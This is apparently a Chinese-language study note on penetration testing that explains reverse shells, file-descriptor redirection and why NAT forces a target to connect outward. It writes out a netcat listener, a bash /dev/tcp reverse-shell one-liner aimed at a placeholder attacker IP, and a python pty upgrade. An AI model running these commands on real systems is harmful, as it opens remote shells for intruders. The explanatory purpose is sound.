---
title: "NAT 與 Reverse Shell — 為什麼拿 shell 只能讓靶機主動連出來"
date: "2026-07-30"
category: "Network"
tags: ["network", "nat", "reverse-shell", "pt", "concept"]
summary: "拆解 bash -i >& /dev/tcp/<myIP>/4444 0>&1 裡三個 FD 怎麼全接到同一條 socket、為什麼還要再用 pty 升級一次，以及 NAT 轉譯表裡沒有那筆對應記錄時，從外面打進內網的封包會發生什麼事。"
---

## Reverse Shell

### 什麼是 Reverse Shell

PT 時用來操作靶機的手段。
只要能讓靶機執行我們的程式碼，第一時間就建立 Reverse Shell。

做法是讓靶機**主動向外建立一條 TCP 連線**，
再把它自己 shell 的輸入輸出接到那條連線上，
我們這邊監聽就等於拿到它的 shell。

### 實際長什麼樣

我這邊先開監聽：

```bash
nc -lvnp 4444
```

假設拿到 Web Shell，讓靶機執行：

```bash
bash -i >& /dev/tcp/<myIP>/4444 0>&1
```

拆解：

- `bash -i` — 啟動互動式 bash（有提示符號、有歷史、讀 bashrc）
- `>& /dev/tcp/<myIP>/4444` — 開一條到我的 TCP 連線，並把 stdout 和 stderr 都導過去
- `0>&1` — 把 stdin 接到「FD 1 當下指向的地方」，也就是那條 socket

三個 FD 全接到同一條連線 → 湊齊一個基礎 shell。

> `&1` 複製的是**當下的指向**，不是動態連結。
> 所以順序有差：`> file 2>&1` 和 `2>&1 > file` 結果不同。

### Upgrade Shell

實務上還要再升級一次：
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

因為 `bash -i` 只是「表現得像互動模式」，底層接的是 socket 不是 PTY。
升級後 Ctrl+C、sudo、su、vim 才會正常。

---

## NAT

### 什麼是 NAT

Network Address Translation，讓多台內網主機共用一個對外 IP。

內網主機要對外連線時，NAT 把來源 (IP, port) 對應到一個對外 port，
**並把這筆對應記在轉譯表裡**。回程封包靠這筆記錄找回內網主機。

號碼本身不重要，重要的是「有沒有這筆記錄」。

### 為什麼 NAT 會影響到我們

在 NAT 內部開服務，因為沒有主動對外連線，
轉譯表裡就沒有對應記錄 → 外面打進來的封包無處可送 → 丟棄。

一般要對外開服務，得在 Router 上做一次 Port Forwarding，
手動把內網 port 映射到外網 port。

所以就算我們有辦法讓內網機器把 bash 開在 1234 port，
我們在外面怎麼掃都掃不到。

**這就是為什麼要用「讓內網機器主動向外連線」的方式拿 shell。**
